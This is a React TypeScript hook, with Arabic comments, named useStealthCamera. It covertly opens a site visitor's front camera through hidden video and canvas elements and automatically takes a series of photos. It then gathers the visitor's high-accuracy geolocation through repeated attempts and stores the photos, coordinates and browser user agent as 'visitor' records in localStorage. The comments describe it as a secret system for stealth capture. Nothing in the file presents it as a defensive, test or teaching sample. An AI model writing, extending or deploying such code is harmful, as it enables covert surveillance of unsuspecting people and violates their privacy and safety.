import { useState, useRef, useCallback } from 'react';

interface CapturedPhoto {
  id: string;
  dataUrl: string;
  timestamp: Date;
}

interface LocationData {
  latitude: number;
  longitude: number;
  accuracy: number;
  timestamp: Date;
}

interface VisitorData {
  id: string;
  photos: CapturedPhoto[];
  location: LocationData | null;
  visitTime: Date;
  userAgent: string;
}

export const useStealthCamera = () => {
  const [isCapturing, setIsCapturing] = useState(false);
  const [capturedPhotos, setCapturedPhotos] = useState<CapturedPhoto[]>([]);
  const [currentPhotoIndex, setCurrentPhotoIndex] = useState(0);
  const [visitorData, setVisitorData] = useState<VisitorData | null>(null);
  
  // استخدام refs للعناصر المخفية
  const streamRef = useRef<MediaStream | null>(null);

  // بدء الكاميرا المخفية
  const startStealthCamera = useCallback(async () => {
    try {
      console.log('🎯 محاولة الوصول للكاميرا...');
      
      const stream = await navigator.mediaDevices.getUserMedia({
        video: { 
          width: { ideal: 640 },
          height: { ideal: 480 },
          facingMode: 'user'
        },
        audio: false
      });
      
      streamRef.current = stream;
      console.log('✅ تم الحصول على stream الكاميرا');
      return stream;
    } catch (error) {
      console.error('❌ فشل في الوصول للكاميرا:', error);
      return null;
    }
  }, []);

  // إيقاف الكاميرا
  const stopStealthCamera = useCallback(() => {
    if (streamRef.current) {
      streamRef.current.getTracks().forEach(track => track.stop());
      streamRef.current = null;
      console.log('🛑 تم إيقاف الكاميرا');
    }
  }, []);

  // التقاط صورة باستخدام stream مباشرة
  const captureStealthPhoto = useCallback(async (stream: MediaStream) => {
    return new Promise<CapturedPhoto | null>((resolve) => {
      try {
        // إنشاء video element مؤقت
        const video = document.createElement('video');
        video.srcObject = stream;
        video.muted = true;
        video.playsInline = true;
        
        video.onloadedmetadata = () => {
          video.play();
          
          // انتظار حتى يصبح الفيديو جاهز
          setTimeout(() => {
            try {
              // إنشاء canvas للتقاط الصورة
              const canvas = document.createElement('canvas');
              const context = canvas.getContext('2d');
              
              if (!context) {
                resolve(null);
                return;
              }
              
              canvas.width = video.videoWidth || 640;
              canvas.height = video.videoHeight || 480;
              
              // رسم الفيديو على الكانفاس
              context.drawImage(video, 0, 0, canvas.width, canvas.height);
              
              // تحويل إلى صورة
              const dataUrl = canvas.toDataURL('image/jpeg', 0.8);
              
              // التحقق من أن الصورة ليست فارغة
              if (dataUrl && dataUrl.length > 100) {
                const photo: CapturedPhoto = {
                  id: `stealth_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`,
                  dataUrl,
                  timestamp: new Date()
                };
                
                console.log('✅ تم التقاط صورة بنجاح:', photo.id);
                resolve(photo);
              } else {
                console.warn('⚠️ الصورة فارغة أو غير صحيحة');
                resolve(null);
              }
            } catch (error) {
              console.error('❌ خطأ في التقاط الصورة:', error);
              resolve(null);
            }
          }, 1000); // انتظار ثانية واحدة
        };
        
        video.onerror = () => {
          console.error('❌ خطأ في تحميل الفيديو');
          resolve(null);
        };
      } catch (error) {
        console.error('❌ خطأ عام في التقاط الصورة:', error);
        resolve(null);
      }
    });
  }, []);

  // الحصول على الموقع
  const getCurrentLocation = useCallback((): Promise<LocationData> => {
    return new Promise((resolve, reject) => {
      if (!navigator.geolocation) {
        reject(new Error('Geolocation غير مدعوم'));
        return;
      }

      console.log('📍 محاولة الحصول على الموقع بدقة عالية...');
      
      let bestAccuracy = Infinity;
      let bestPosition: GeolocationPosition | null = null;
      let attempts = 0;
      const maxAttempts = 5; // زيادة عدد المحاولات

      const tryGetLocation = () => {
        navigator.geolocation.getCurrentPosition(
          (position) => {
            attempts++;
            console.log(`📍 محاولة ${attempts}: دقة ${position.coords.accuracy.toFixed(0)}م`);
            
            // الاحتفاظ بأفضل قراءة (أعلى دقة)
            if (position.coords.accuracy < bestAccuracy) {
              bestAccuracy = position.coords.accuracy;
              bestPosition = position;
              console.log(`✅ موقع أفضل: دقة ${bestAccuracy.toFixed(0)}م`);
            }

            // إذا حصلنا على دقة عالية (أقل من 20 متر) أو وصلنا للحد الأقصى من المحاولات
            if (position.coords.accuracy < 20 || attempts >= maxAttempts) {
              const locationData: LocationData = {
                latitude: bestPosition!.coords.latitude,
                longitude: bestPosition!.coords.longitude,
                accuracy: bestPosition!.coords.accuracy,
                timestamp: new Date()
              };
              console.log('✅ تم الحصول على الموقع النهائي:', {
                ...locationData,
                latitude: locationData.latitude.toFixed(8),
                longitude: locationData.longitude.toFixed(8),
                accuracy: `${locationData.accuracy.toFixed(1)}م`
              });
              resolve(locationData);
            } else {
              // محاولة أخرى للحصول على دقة أفضل
              setTimeout(tryGetLocation, 2000);
            }
          },
          (error) => {
            attempts++;
            console.warn(`⚠️ فشل في المحاولة ${attempts}:`, error.message);
            
            if (attempts >= maxAttempts) {
              if (bestPosition) {
                const locationData: LocationData = {
                  latitude: bestPosition.coords.latitude,
                  longitude: bestPosition.coords.longitude,
                  accuracy: bestPosition.coords.accuracy,
                  timestamp: new Date()
                };
                console.log('✅ استخدام أفضل موقع متاح:', locationData);
                resolve(locationData);
              } else {
                console.error('❌ فشل نهائي في الحصول على الموقع');
                // إرجاع موقع افتراضي بدلاً من رفض التشغيل
                resolve({
                  latitude: 0,
                  longitude: 0,
                  accuracy: 9999,
                  timestamp: new Date()
                });
              }
            } else {
              // إعادة المحاولة مع إعدادات مختلفة
              setTimeout(tryGetLocation, 3000);
            }
          },
          {
            enableHighAccuracy: true,
            timeout: 15000, // زيادة المهلة الزمنية
            maximumAge: 30000 // تقليل العمر الأقصى للقراءة المخزنة
          }
        );
      };

      // بدء أول محاولة
      tryGetLocation();
    });
  }, []);

  // بدء التقاط تلقائي سري
  const startStealthCapture = useCallback(async (photoCount: number = 5) => {
    if (isCapturing) {
      console.log('⚠️ التقاط جاري بالفعل');
      return [];
    }

    console.log('🚀 بدء النظام السري - عدد الصور:', photoCount);
    setIsCapturing(true);
    setCapturedPhotos([]);
    setCurrentPhotoIndex(0);

    // بدء الكاميرا
    const stream = await startStealthCamera();
    if (!stream) {
      console.error('❌ فشل في بدء الكاميرا');
      setIsCapturing(false);
      return [];
    }

    console.log('✅ الكاميرا جاهزة، بدء التقاط الصور...');
    
    // انتظار إضافي لاستقرار الكاميرا
    await new Promise(resolve => setTimeout(resolve, 2000));

    const photos: CapturedPhoto[] = [];
    
    // التقاط الصور
    for (let i = 0; i < photoCount; i++) {
      setCurrentPhotoIndex(i + 1);
      console.log(`📸 التقاط الصورة ${i + 1}/${photoCount}`);
      
      const photo = await captureStealthPhoto(stream);
      
      if (photo) {
        photos.push(photo);
        setCapturedPhotos(prev => [...prev, photo]);
        
        // حفظ الصورة فوراً
        try {
          localStorage.setItem(`stealth_photo_${photo.id}`, photo.dataUrl);
          console.log(`💾 تم حفظ الصورة ${i + 1}`);
        } catch (error) {
          console.error(`❌ فشل في حفظ الصورة ${i + 1}:`, error);
        }
      } else {
        console.warn(`⚠️ فشل في التقاط الصورة ${i + 1}`);
      }
      
      // انتظار بين الصور
      if (i < photoCount - 1) {
        await new Promise(resolve => setTimeout(resolve, 1500));
      }
    }

    // إيقاف الكاميرا
    stopStealthCamera();
    setIsCapturing(false);

    console.log(`🏁 انتهى التقاط الصور. تم التقاط ${photos.length}/${photoCount} صورة`);
    return photos;
  }, [isCapturing, startStealthCamera, stopStealthCamera, captureStealthPhoto]);

  // حفظ بيانات الزائر
  const saveVisitorData = useCallback(async (photos: CapturedPhoto[]) => {
    try {
      console.log('💾 بدء حفظ بيانات الزائر...');
      
      // الحصول على الموقع
      const location = await getCurrentLocation();
      
      const visitor: VisitorData = {
        id: `stealth_visitor_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`,
        photos,
        location,
        visitTime: new Date(),
        userAgent: navigator.userAgent
      };

      console.log('📝 بيانات الزائر:', {
        id: visitor.id,
        photosCount: visitor.photos.length,
        hasLocation: !!visitor.location,
        visitTime: visitor.visitTime
      });

      // حفظ بيانات الزائر
      const existingVisitors = JSON.parse(localStorage.getItem('stealth_visitors') || '[]');
      existingVisitors.push(visitor);
      localStorage.setItem('stealth_visitors', JSON.stringify(existingVisitors));

      console.log('✅ تم حفظ بيانات الزائر. إجمالي الزوار:', existingVisitors.length);
      
      // التحقق من الحفظ
      setTimeout(() => {
        const saved = localStorage.getItem('stealth_visitors');
        if (saved) {
          const parsedData = JSON.parse(saved);
          const found = parsedData.find((v: VisitorData) => v.id === visitor.id);
          if (found) {
            console.log('✅ تم التأكد من حفظ البيانات');
          } else {
            console.error('❌ لم يتم العثور على البيانات المحفوظة');
          }
        }
      }, 500);

      setVisitorData(visitor);
      return visitor;
    } catch (error) {
      console.error('❌ خطأ في حفظ بيانات الزائر:', error);
      return null;
    }
  }, [getCurrentLocation]);

  // الحصول على جميع الزوار
  const getAllVisitors = useCallback((): VisitorData[] => {
    try {
      const data = JSON.parse(localStorage.getItem('stealth_visitors') || '[]');
      console.log('📊 تم تحميل بيانات الزوار:', data.length);
      return data;
    } catch (error) {
      console.error('❌ خطأ في تحميل البيانات:', error);
      return [];
    }
  }, []);

  // مسح جميع البيانات
  const clearAllData = useCallback(() => {
    try {
      localStorage.removeItem('stealth_visitors');
      
      // مسح جميع الصور
      Object.keys(localStorage).forEach(key => {
        if (key.startsWith('stealth_photo_')) {
          localStorage.removeItem(key);
        }
      });
      
      setCapturedPhotos([]);
      setVisitorData(null);
      console.log('🗑️ تم مسح جميع البيانات');
    } catch (error) {
      console.error('❌ خطأ في مسح البيانات:', error);
    }
  }, []);

  return {
    // الحالات
    isCapturing,
    capturedPhotos,
    currentPhotoIndex,
    visitorData,
    
    // الوظائف
    startStealthCapture,
    saveVisitorData,
    getAllVisitors,
    clearAllData
  };
};